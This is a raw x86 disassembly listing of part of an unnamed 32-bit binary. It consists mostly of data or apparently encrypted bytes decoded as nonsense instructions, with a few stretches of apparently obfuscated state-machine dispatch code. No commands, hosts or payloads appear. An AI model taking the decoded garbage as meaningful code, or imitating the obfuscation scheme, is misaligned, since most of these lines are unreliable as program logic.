  40ec00:	mov    esp,DWORD PTR [ebx-0x3453fba2]
  40ec06:	loop   0x40ec36
  40ec08:	mov    ah,0x87
  40ec0a:	in     al,dx
  40ec0b:	dec    edx
  40ec0c:	test   al,0x6e
  40ec0e:	mov    al,0xc4
  40ec10:	mov    esp,DWORD PTR [edi]
  40ec12:	pop    es
  40ec13:	mov    dl,0x3f
  40ec15:	xchg   esi,eax
  40ec16:	repnz push 0xffffffc9
  40ec19:	cmp    al,0x1c
  40ec1b:	mov    eax,0x76153444
  40ec20:	or     DWORD PTR [edx-0x6b4beff7],0xe3bf4ebc
  40ec2a:	(bad)  
  40ec2b:	repz push ds
  40ec2d:	inc    edi
  40ec2e:	retf   0x7988
  40ec31:	shr    esi,0x22
  40ec34:	loop   0x40ec16
  40ec36:	mov    bl,0x54
  40ec38:	out    dx,eax
  40ec39:	add    al,0x1a
  40ec3b:	dec    esp
  40ec3c:	xchg   BYTE PTR [ebp-0x51f36e9e],dl
  40ec42:	shr    BYTE PTR [eax],cl
  40ec44:	jmp    0x40eca8
  40ec46:	or     DWORD PTR [ecx],ebx
  40ec48:	mov    ebx,DWORD PTR [ebx+esi*2-0x75]
  40ec4c:	add    bh,al
  40ec4e:	add    eax,0x4336eb
  40ec53:	xchg   esp,eax
  40ec54:	aas    
  40ec55:	add    BYTE PTR [eax],al
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4336b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43362f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433733,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43373f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [ebp+ebp*1-0x9bbaf8],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	inc    BYTE PTR [edx]
  40ecce:	fs push ds
  40ecd0:	clc    
  40ecd1:	adc    BYTE PTR [edx],al
  40ecd3:	sahf   
  40ecd4:	mov    esi,DWORD PTR [edi+0x57]
  40ecd7:	jecxz  0x40ed14
  40ecd9:	aaa    
  40ecda:	outs   dx,BYTE PTR ds:[esi]
  40ecdb:	xchg   DWORD PTR [edx+0x7366cfb7],ecx
  40ece1:	or     ah,BYTE PTR [edx]
  40ece3:	fidivr WORD PTR [eax]
  40ece5:	mov    ds:0x7b171a0e,eax
  40ecea:	push   0x40cb6e41
  40ecef:	imul   edi,edi,0xffffffd6
  40ecf2:	pop    edx
  40ecf3:	jo     0x40ecf1
  40ecf5:	cmp    dh,BYTE PTR [ecx+0x76]
  40ecf8:	aas    
  40ecf9:	inc    eax
  40ecfa:	std    
  40ecfb:	or     DWORD PTR [ecx-0x68],ecx
  40ecfe:	pop    ecx
  40ecff:	jmp    0x9ac0:0x6d5b7f83
  40ed06:	fsub   st(0),st
  40ed08:	jmp    0xac073cb5
  40ed0d:	fiadd  DWORD PTR [edi]
  40ed0f:	inc    esi
  40ed10:	mov    edi,0xbee937b9
  40ed15:	inc    ebx
  40ed16:	lock jnp 0x40ed65
  40ed19:	cwde   
  40ed1a:	je     0x40ed5f
  40ed1c:	push   edi
  40ed1d:	and    ch,bl
  40ed1f:	vandnps xmm1,xmm3,XMMWORD PTR [esi+0x29]
  40ed24:	jg     0x40ecf5
  40ed26:	cmc    
  40ed27:	push   0x16
  40ed29:	call   0x590656bd
  40ed2e:	loope  0x40ed5b
  40ed30:	les    edi,FWORD PTR [edi+ebx*1-0x7e]
  40ed34:	inc    ebx
  40ed35:	fcmovnu st,st(4)
  40ed37:	sbb    DWORD PTR [ecx],edi
  40ed39:	test   DWORD PTR [ebp+0x21],esi
  40ed3c:	pop    ebx
  40ed3d:	xor    eax,0xa1a466bf
  40ed42:	dec    esp
  40ed43:	ins    BYTE PTR es:[edi],dx
  40ed44:	xor    al,0xa5
  40ed46:	pop    ds
  40ed47:	loope  0x40ecff
  40ed49:	imul   esi,DWORD PTR [edi+ecx*1],0x67aaedbe
  40ed50:	daa    
  40ed51:	aam    0x80
  40ed53:	mov    al,0x6f
  40ed55:	push   0xfffffffa
  40ed57:	int3   
  40ed58:	jge    0x40ecdf
  40ed5a:	leave  
  40ed5b:	inc    edi
  40ed5c:	cdq    
  40ed5d:	xor    ecx,esi
  40ed5f:	pop    ebx
  40ed61:	std    
  40ed62:	data16 cli 
  40ed64:	stos   DWORD PTR es:[edi],eax
  40ed65:	pusha  
  40ed66:	inc    ebp
  40ed67:	inc    DWORD PTR ss:[edi-0x3c]
  40ed6b:	mov    dh,0xf7
  40ed6d:	je     0x40ed2f
  40ed6f:	retf   0xdfab
  40ed72:	mov    ah,0xc8
  40ed74:	push   edx
  40ed75:	scas   eax,DWORD PTR es:[edi]
  40ed76:	inc    edx
  40ed77:	jno    0x40ed4b
  40ed79:	push   ebx
  40ed7a:	mov    ch,0x86
  40ed7c:	pop    eax
  40ed7d:	(bad)  
  40ed7e:	jo     0x40edd3
  40ed80:	loope  0x40ed18
  40ed82:	jge    0x40eda3
  40ed84:	mov    eax,ds:0x8739a4a9
  40ed89:	sbb    edx,DWORD PTR [ebx]
  40ed8b:	pop    edi
  40ed8c:	repnz mov BYTE PTR [edx+0x24],cl
  40ed90:	outs   dx,DWORD PTR ds:[esi]
  40ed91:	out    0x82,eax
  40ed93:	dec    edi
  40ed94:	imul   ebx,DWORD PTR [ebp-0x74c36d14],0xffffffef
  40ed9b:	jbe    0x40ed39
  40ed9d:	inc    ebx
  40ed9e:	xchg   esi,eax
  40ed9f:	pop    es
  40eda0:	(bad)  
  40eda1:	repz in eax,dx
  40eda3:	mov    ecx,0x39c108d1
  40eda8:	dec    ebp
  40eda9:	push   ebp
  40edaa:	lock pop edx
  40edac:	(bad)  
  40edad:	dec    esp
  40edae:	dec    esi
  40edaf:	mov    ?,WORD PTR [eax]
  40edb1:	lea    edi,[eax-0x47]
  40edb4:	mov    al,ds:0xc4fc6d73
  40edb9:	inc    ebp
  40edba:	add    al,0x46
  40edbc:	(bad)  
  40edbd:	fdiv   DWORD PTR [ebx-0x6c04353c]
  40edc3:	test   DWORD PTR [edi],ebp
  40edc5:	xor    edi,DWORD PTR [ebp+0x75]
  40edc8:	add    edi,DWORD PTR [ecx]
  40edca:	and    eax,eax
  40edcc:	xor    eax,0x9a4035e3
  40edd1:	adc    DWORD PTR [edi+ecx*2],0xba32a93c
  40edd8:	jne    0x40eddc
  40edda:	aam    0xba
  40eddc:	push   edx
  40eddd:	es inc esp
  40eddf:	and    BYTE PTR [esi-0xd1b3e46],0x46
  40ede6:	or     al,bl
  40ede8:	aas    
  40ede9:	stos   DWORD PTR es:[edi],eax
  40edea:	xchg   esp,eax
  40edeb:	and    BYTE PTR [edx+0x4a1a3657],dl
  40edf1:	cmp    eax,0x3596aaa
  40edf6:	test   al,0xf0
  40edf8:	xchg   ebx,eax
  40edf9:	push   edi
  40edfa:	aas    
  40edfb:	scas   eax,DWORD PTR es:[edi]
  40edfc:	and    ebp,edi
  40edfe:	cmp    al,0x27
  40ee00:	jl     0x40ee77
  40ee02:	mov    ds:0x2cecc5d9,al
  40ee07:	cmp    eax,0xc4694a9f
  40ee0c:	stc    
  40ee0d:	mov    fs:0x8b304016,eax
  40ee13:	out    dx,al
  40ee14:	sbb    eax,0xf16665af
  40ee19:	push   edx
  40ee1a:	jne    0x40edb4
  40ee1c:	mov    bl,0xa7
  40ee1e:	jb     0x40edd6
  40ee20:	minps  xmm7,xmm3
  40ee23:	xor    BYTE PTR [ebx],dl
  40ee25:	mov    ds:0x51abf932,al
  40ee2a:	mov    edi,0xab846527
  40ee2f:	xor    DWORD PTR [edi-0x80],esi
  40ee32:	stos   BYTE PTR es:[edi],al
  40ee33:	rol    BYTE PTR [ebp-0x10e7e845],cl
  40ee39:	inc    edx
  40ee3a:	cmp    bl,dh
  40ee3c:	popa   
  40ee3d:	popf   
  40ee3e:	(bad)  
  40ee3f:	or     eax,0xb1fdc5d6
  40ee44:	pop    esp
  40ee45:	xchg   edx,eax
  40ee46:	push   ebx
  40ee47:	push   edi
  40ee48:	rcr    BYTE PTR [ebp+0x54af3bd1],1
  40ee4e:	inc    esi
  40ee4f:	outs   dx,BYTE PTR ds:[esi]
  40ee50:	dec    ebx
  40ee51:	push   0x3a18cf7c
  40ee56:	aas    
  40ee57:	dec    esi
  40ee58:	lds    esp,FWORD PTR [edi-0x331ae1a4]
  40ee5e:	jo     0x40edfb
  40ee60:	leave  
  40ee61:	sbb    esi,edx
  40ee63:	addr16 adc bl,0xc
  40ee67:	mov    bh,0xc4
  40ee69:	xchg   edi,eax
  40ee6a:	lds    edi,FWORD PTR [eax+eax*4+0x26]
  40ee6e:	(bad)  
  40ee70:	fcomp  DWORD PTR [edi-0x6e]
  40ee73:	cs popa 
  40ee75:	mov    dl,0x46
  40ee77:	and    BYTE PTR cs:[edx-0x48],bh
  40ee7b:	outs   dx,DWORD PTR ds:[esi]
  40ee7c:	mov    ebx,0x408124dd
  40ee81:	mov    bh,0xda
  40ee83:	jmp    0xd0dd4294
  40ee88:	inc    esi
  40ee89:	push   ds
  40ee8a:	mov    ebx,0xa632176a
  40ee8f:	jg     0x40ee33
  40ee91:	lods   al,BYTE PTR ds:[esi]
  40ee92:	cmc    
  40ee93:	rol    BYTE PTR [ebp+0x4d],cl
  40ee96:	sbb    DWORD PTR [esi],edx
  40ee98:	mov    al,0x3b
  40ee9a:	xchg   esi,eax
  40ee9b:	ins    BYTE PTR es:[edi],dx
  40ee9c:	loope  0x40ee2b
  40ee9e:	fwait
  40ee9f:	pop    ss
  40eea0:	loopne 0x40ee70
  40eea2:	mov    WORD PTR [esi-0x21],fs
  40eea5:	(bad)  
  40eea6:	and    eax,0x68f6c7a1
  40eeab:	xor    BYTE PTR [esi],bl
  40eead:	das    
  40eeae:	bound  edi,QWORD PTR [edi-0x19]
  40eeb1:	xor    DWORD PTR [ecx-0x5b46b00],0x52
  40eeb8:	push   ebx
  40eeb9:	push   es
  40eeba:	fdiv   DWORD PTR [ebx+edi*2+0x2076bc0]
  40eec1:	sbb    ebp,eax
  40eec3:	cmp    edx,esi
  40eec5:	sbb    BYTE PTR [edx],dh
  40eec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec8:	ja     0x40eebe
  40eeca:	ss ja  0x40ef05
  40eecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eece:	xchg   edi,eax
  40eecf:	test   edi,0xe3f162e
  40eed5:	inc    edx
  40eed6:	adc    al,0x82
  40eed8:	mov    esi,0xe8f59698
  40eedd:	popf   
  40eede:	pop    ebx
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx-0x486710ba],0x8fc37e78
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef6b
  40ef11:	push   0xbaba7a5
  40ef16:	outs   dx,BYTE PTR ds:[esi]
  40ef17:	adc    al,BYTE PTR [edi-0x31e01c3d]
  40ef1d:	mov    edi,0x39cc702b
  40ef22:	aaa    
  40ef23:	idiv   DWORD PTR [eax-0x25f59ddf]
  40ef29:	cwde   
  40ef2a:	sbb    al,0x5a
  40ef2c:	push   cs
  40ef2d:	xor    dh,dh
  40ef2f:	add    BYTE PTR [esi+edi*2-0x17],dl
  40ef33:	fisubr DWORD PTR [edi-0x30]
  40ef36:	xchg   DWORD PTR [edx],ebp
  40ef38:	add    bl,BYTE PTR [eax-0x37e69944]
  40ef3e:	test   eax,0xdcf792ea
  40ef43:	and    BYTE PTR [edx+eiz*4],0xee
  40ef47:	mov    al,0xbe
  40ef49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef4a:	sahf   
  40ef4b:	xchg   ecx,eax
  40ef4c:	jmp    0x40efbd
  40ef4e:	add    ecx,edx
  40ef50:	stos   BYTE PTR es:[edi],al
  40ef51:	(bad)  
  40ef52:	mov    ah,0x70
  40ef54:	ret    0x9516
  40ef57:	jmp    0xf8791485
  40ef5c:	loop   0x40ef38
  40ef5e:	daa    
  40ef5f:	sub    dh,bh
  40ef61:	jge    0x40ef5f
  40ef63:	addr16 in al,dx
  40ef65:	lea    esi,[edi+0x17083272]
  40ef6b:	ficomp DWORD PTR [edi-0x13]
  40ef6e:	repnz pop ebp
  40ef70:	lea    ebp,[eax]
  40ef72:	scas   eax,DWORD PTR es:[edi]
  40ef73:	fidivr WORD PTR [ecx+0x3c6d936d]
  40ef79:	mov    bl,dh
  40ef7b:	add    BYTE PTR [ecx+esi*4],ah
  40ef7e:	sbb    BYTE PTR [eax],ah
  40ef80:	add    BYTE PTR [ebx-0x55],0x7
  40ef84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef85:	sub    al,0x67
  40ef87:	retf   0xc4aa
  40ef8a:	cwde   
  40ef8b:	inc    edi
  40ef8c:	xchg   ebx,eax
  40ef8d:	aas    
  40ef8e:	ret    
  40ef8f:	xor    eax,0x8f12e681
  40ef94:	pop    es
  40ef95:	and    al,0xab
  40ef97:	mov    ch,0xf9
  40ef99:	ins    BYTE PTR es:[edi],dx
  40ef9a:	jle    0x40efeb
  40ef9c:	jmp    0xa5242532
  40efa1:	int3   
  40efa2:	repz mov bl,0xf8
  40efa5:	imul   esi,DWORD PTR [eax],0x627e2216
  40efab:	sbb    ebx,DWORD PTR [edi+0x13]
  40efae:	mov    bx,0xccce
  40efb2:	pop    ecx
  40efb3:	lock mov dl,0xed
  40efb7:	cmp    DWORD PTR [ecx+0x1fbf976e],edi
  40efbd:	push   es
  40efbe:	pop    edi
  40efbf:	mov    cs,WORD PTR [esi+0x70]
  40efc2:	inc    eax
  40efc3:	cld    
  40efc4:	push   ebp
  40efc5:	mov    esp,0x9352a72e
  40efca:	pusha  
  40efcb:	add    edi,edi
  40efcd:	add    DWORD PTR [ecx+eax*1-0x40e6a71a],0x839f09d8
  40efd8:	push   es
  40efd9:	xor    BYTE PTR [ebx+0x58],dh
  40efdc:	mov    cl,0xb2
  40efde:	fcom   QWORD PTR [esi-0x2e]
  40efe1:	dec    ebx
  40efe2:	div    BYTE PTR [ebp-0x57f015dc]
  40efe8:	and    eax,0x18d4066a
  40efed:	xchg   esi,eax
  40efee:	(bad)  
  40efef:	pop    esi
  40eff0:	pusha  
  40eff1:	mov    ds:0x6ba37e17,eax
  40eff6:	cwde   
  40eff7:	xlat   BYTE PTR ds:[ebx]
  40eff8:	dec    ecx
  40eff9:	jno    0x40ef93
  40effb:	push   ebp
  40effc:	jmp    0xae83065c
  40f001:	cmp    ebp,DWORD PTR [edx]
  40f003:	inc    eax
  40f004:	sbb    BYTE PTR [esi-0x7905b00c],ch
  40f00a:	fucomp st(2)
  40f00c:	push   edx
  40f00d:	jnp    0x40ef90
  40f00f:	adc    al,0x6f
  40f011:	jne    0x40f082
  40f013:	pop    ebp
  40f014:	aad    0xaf
  40f016:	loope  0x40efb4
  40f018:	scas   eax,DWORD PTR es:[edi]
  40f019:	adc    eax,0x9f884c19
  40f01e:	jae    0x40f077
  40f020:	pop    ecx
  40f021:	and    cl,ch
  40f023:	out    dx,eax
  40f024:	mov    esp,0xaf5e4390
  40f029:	les    edx,FWORD PTR [ecx+0x4f]
  40f02c:	or     BYTE PTR [eax+edi*8+0x58],bh
  40f030:	out    dx,al
  40f031:	int    0x14
  40f033:	ins    BYTE PTR es:[edi],dx
  40f034:	cmp    al,0xdc
  40f036:	or     cl,BYTE PTR [edi+0x71]
  40f039:	fcmovnu st,st(2)
  40f03b:	and    esp,ecx
  40f03d:	lods   al,BYTE PTR ds:[esi]
  40f03e:	push   ebp
  40f03f:	push   edx
  40f040:	dec    eax
  40f041:	xchg   edx,eax
  40f042:	leave  
  40f043:	mov    DWORD PTR [ecx],ebp
  40f045:	or     DWORD PTR [edx-0x28f3e738],edx
  40f04b:	push   esi
  40f04c:	in     al,dx
  40f04d:	and    ecx,DWORD PTR [ebx+eiz*1]
  40f050:	sti    
  40f051:	in     eax,0x57
  40f053:	lock (bad) 
  40f055:	mov    esp,0xb75fa46d
  40f05a:	or     BYTE PTR [esi+0x47],dh
  40f05d:	rcr    DWORD PTR [edx],cl
  40f05f:	xchg   ebp,eax
  40f060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f061:	imul   esi,DWORD PTR [esi-0x2b4acf42],0xb8aaebbb
  40f06b:	sub    BYTE PTR [edx-0xecfb19],cl
  40f071:	xchg   ebx,eax
  40f072:	test   DWORD PTR [esi-0x43],eax
  40f075:	pop    es
  40f076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f077:	call   0xc2355233
  40f07c:	cmp    eax,0xe870938a
  40f081:	sub    BYTE PTR [edi-0x2037d045],ch
  40f087:	or     al,al
  40f089:	cmp    al,0x92
  40f08b:	and    esp,DWORD PTR [edi]
  40f08d:	or     al,0xd
  40f08f:	iret   
  40f090:	cwde   
  40f091:	push   ecx
  40f092:	data16 aam 0xb7
  40f095:	lds    edx,FWORD PTR [esi+0x67]
  40f098:	inc    BYTE PTR [ecx-0x22fc59f0]
  40f09e:	push   0x8f8c2f32
  40f0a3:	adc    al,0x14
  40f0a5:	jbe    0x40f112
  40f0a7:	mov    ah,0xcd
  40f0a9:	ss scas al,BYTE PTR es:[edi]
  40f0ab:	adc    BYTE PTR ds:0xd0d2481,ch
  40f0b1:	xchg   esp,eax
  40f0b2:	in     al,0x72
  40f0b4:	clc    
  40f0b5:	call   0xf3192598
  40f0ba:	dec    edx
  40f0bb:	pop    ss
  40f0bc:	push   ebp
  40f0be:	rcl    DWORD PTR [esi+ebx*8+0x2d],cl
  40f0c2:	cdq    
  40f0c3:	loop   0x40f04e
  40f0c5:	add    cl,BYTE PTR [esi-0x32]
  40f0c8:	jnp    0x40f0f3
  40f0ca:	fild   WORD PTR [ecx-0x649ddb8a]
  40f0d0:	(bad)  [edx+0x744137bb]
  40f0d6:	scas   eax,DWORD PTR es:[edi]
  40f0d7:	adc    BYTE PTR [edx+0x5a76ca2d],dl
  40f0dd:	jl     0x40f0f8
  40f0df:	fsub   st(1),st
  40f0e1:	in     eax,dx
  40f0e2:	(bad)  
  40f0e3:	mov    ah,0x70
  40f0e5:	aam    0x51
  40f0e7:	sbb    al,0x58
  40f0e9:	fistp  QWORD PTR [eax-0x7a713016]
  40f0ef:	ja     0x40f12b
  40f0f1:	in     al,0x9c
  40f0f3:	or     DWORD PTR [ecx],eax
  40f0f5:	lods   al,BYTE PTR ds:[esi]
  40f0f6:	data16 cmp ch,dl
  40f0f9:	mov    bl,0xdf
  40f0fb:	jle    0x40f0fd
  40f0fd:	pop    ebp
  40f0fe:	mov    ds:0x71a619e3,eax
  40f103:	clc    
  40f104:	icebp  
  40f105:	sbb    DWORD PTR [ecx+edx*4+0x38],eax
  40f109:	(bad)  
  40f10a:	popa   
  40f10b:	xchg   edi,eax
  40f10c:	jge    0x40f13f
  40f10e:	and    ah,BYTE PTR [edi-0xf]
  40f111:	sub    eax,eax
  40f113:	pop    esi
  40f114:	dec    ecx
  40f115:	mov    edi,0x4363daa3
  40f11b:	rcl    BYTE PTR [eax-0x7edb3b9b],cl
  40f121:	jmp    DWORD PTR [ebx+0xf000001]
  40f127:	test   DWORD PTR [edi+0x0],ecx
  40f12a:	add    BYTE PTR [eax],al
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0x2ee88a54]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f22b
  40f1e9:	rsqrtps xmm6,xmm4
  40f1ec:	inc    esi
  40f1ed:	icebp  
  40f1ee:	imul   ch
  40f1f0:	xor    eax,0xb386629f
  40f1f5:	sub    eax,0x9d4c48be
  40f1fa:	and    ah,BYTE PTR [ebx-0x7c79e2c]
  40f200:	cld    
  40f201:	loopne 0x40f245
  40f203:	fwait
  40f204:	dec    ebp
  40f206:	outs   dx,BYTE PTR ds:[esi]
  40f207:	dec    eax
  40f208:	cmp    al,0x94
  40f20a:	or     dl,ah
  40f20c:	inc    eax
  40f20d:	ja     0x40f209
  40f20f:	out    0xca,eax
  40f211:	mov    cl,0x25
  40f213:	call   0xda94838d
  40f218:	add    ebx,DWORD PTR [ebp+0x5e710c87]
  40f21e:	xor    DWORD PTR [ecx-0xe4d3dc7],0x46
  40f225:	xchg   esp,eax
  40f226:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40f228:	test   BYTE PTR es:[esi],ch
  40f22b:	stos   BYTE PTR es:[edi],al
  40f22c:	push   ds
  40f22d:	xor    DWORD PTR [ecx-0x2b],0x45
  40f231:	xlat   BYTE PTR ds:[ebx]
  40f232:	cwde   
  40f233:	xor    eax,0xf6a1a79b
  40f238:	push   0xffffffec
  40f23a:	ror    BYTE PTR [edi+edx*1-0x4b],0x93
  40f23f:	adc    al,0x3b
  40f241:	in     eax,0xcc
  40f243:	and    eax,0x5c3b7e63
  40f248:	into   
  40f249:	add    DWORD PTR [eax],0x5a
  40f24c:	jl     0x40f1d4
  40f24e:	and    eax,0xd82c9295
  40f253:	lock xor esp,esi
  40f256:	jecxz  0x40f2d2
  40f258:	jns    0x40f285
  40f25a:	(bad)  
  40f25b:	(bad)  
  40f25c:	sbb    cl,BYTE PTR [edx-0x10]
  40f25f:	pop    es
  40f260:	out    0x34,al
  40f262:	push   ebp
  40f263:	inc    edx
  40f264:	ja     0x40f28c
  40f266:	jg     0x40f27c
  40f268:	addr16 and al,0x70
  40f26b:	sbb    eax,0x2dee60ed
  40f270:	ins    DWORD PTR es:[edi],dx
  40f271:	and    eax,0x620afef4
  40f276:	add    cl,BYTE PTR [ebx-0x6f]
  40f279:	mov    ?,WORD PTR [ebp+0x53]
  40f27c:	push   eax
  40f27d:	div    DWORD PTR [ebp-0x15]
  40f280:	push   ebp
  40f281:	mov    WORD PTR [edi],es
  40f283:	inc    edi
  40f284:	xor    ebx,0x4e
  40f287:	in     eax,dx
  40f288:	enter  0x9fec,0xf1
  40f28c:	(bad)  
  40f28d:	aad    0x43
  40f28f:	jmp    0xe2d:0x4cdd88e6
  40f296:	loope  0x40f2c9
  40f298:	call   0x6b00b779
  40f29d:	cmp    eax,0x695bc82f
  40f2a2:	mov    al,ds:0xfe30d78f
  40f2a7:	fistp  QWORD PTR [edx-0x43]
  40f2aa:	sub    BYTE PTR ds:0x9cbd39c6,0x7
  40f2b1:	cmp    al,0x7c
  40f2b3:	mov    ds:0x45c7889a,eax
  40f2b8:	lea    ebp,[eax-0x7c]
  40f2bb:	das    
  40f2bc:	add    ebp,DWORD PTR [ebp+0x7e]
  40f2bf:	cld    
  40f2c0:	in     eax,0xcc
  40f2c2:	scas   eax,DWORD PTR es:[edi]
  40f2c3:	mov    ds:0xba7fab70,eax
  40f2c8:	push   ebp
  40f2c9:	push   ds
  40f2ca:	mov    esi,esi
  40f2cc:	ins    BYTE PTR es:[edi],dx
  40f2cd:	inc    ebp
  40f2ce:	dec    ebx
  40f2cf:	sub    BYTE PTR gs:[ebx-0x3e276a00],dl
  40f2d6:	xchg   esp,eax
  40f2d7:	lds    esi,FWORD PTR gs:[ecx-0x33]
  40f2db:	daa    
  40f2dc:	call   0xd2f52f
  40f2e1:	in     al,dx
  40f2e2:	(bad)  
  40f2e3:	aad    0xc2
  40f2e5:	(bad)  
  40f2e6:	call   0x81876bb0
  40f2eb:	push   ds
  40f2ec:	nop
  40f2ed:	mov    BYTE PTR [edi],al
  40f2ef:	jae    0x40f316
  40f2f1:	imul   eax,DWORD PTR [ebp-0x4a017d1c],0xffffffd0
  40f2f8:	arpl   WORD PTR [ebp-0x217e0ae1],bp
  40f2fe:	inc    edx
  40f2ff:	(bad)  
  40f300:	ss into 
  40f302:	jecxz  0x40f2a4
  40f304:	sahf   
  40f305:	cmp    BYTE PTR [ecx-0x63],dh
  40f308:	and    al,0xdc
  40f30b:	popa   
  40f30c:	lahf   
  40f30d:	dec    ebp
  40f30e:	xchg   cl,bl
  40f310:	ds aam 0x4d
  40f313:	inc    BYTE PTR [ebp+0x69]
  40f316:	jge    0x40f36d
  40f318:	out    dx,eax
  40f319:	call   0xc656:0x7bc64ebf
  40f320:	int3   
  40f321:	fcomp  DWORD PTR [ebx-0x7d]
  40f324:	sbb    DWORD PTR [ebp-0x5b67744f],ebx
  40f32a:	lahf   
  40f32b:	and    al,0xc
  40f32d:	mov    ecx,DWORD PTR [edi]
  40f32f:	jecxz  0x40f312
  40f331:	adc    bh,al
  40f333:	xor    al,0x86
  40f335:	call   0xf80dfed8
  40f33a:	pop    edi
  40f33b:	dec    edi
  40f33c:	(bad)  [ebx+0x416b4164]
  40f342:	dec    edx
  40f343:	stc    
  40f344:	and    al,0xad
  40f346:	rcr    DWORD PTR [esi+ebx*8-0x78],1
  40f34a:	std    
  40f34b:	mov    al,ds:0x152fa490
  40f350:	mov    bh,0xef
  40f352:	pushf  
  40f353:	mov    cl,BYTE PTR [edi+eax*8-0x72]
  40f357:	push   DWORD PTR [ebx-0x14]
  40f35a:	xchg   ecx,eax
  40f35b:	add    al,0x21
  40f35d:	imul   BYTE PTR [ebp-0x2e54747f]
  40f363:	mov    eax,0x28a3effe
  40f368:	iret   
  40f369:	cmp    al,BYTE PTR [ebp+0x2627fb55]
  40f36f:	mov    ?,ebp
  40f371:	xchg   edi,eax
  40f372:	ret    
  40f373:	and    edi,DWORD PTR [ecx+0x4c]
  40f376:	fwait
  40f377:	rol    DWORD PTR [edx+0x6a],1
  40f37a:	dec    dx
  40f37c:	rcl    BYTE PTR [edx+0x79ebabc8],0x46
  40f383:	and    eax,0x9b409253
  40f388:	sbb    ah,BYTE PTR [ecx+0x15edcd99]
  40f38e:	sbb    BYTE PTR [esi+ecx*4-0x7a60c27d],ah
  40f395:	loop   0x40f416
  40f397:	lea    eax,[eax-0x3ba3c8f3]
  40f39d:	xor    eax,0x44e3797
  40f3a2:	xchg   ecx,eax
  40f3a3:	cmc    
  40f3a4:	or     al,0xa6
  40f3a6:	mov    ebp,0x6dd7b56c
  40f3ab:	cdq    
  40f3ac:	out    0x8a,eax
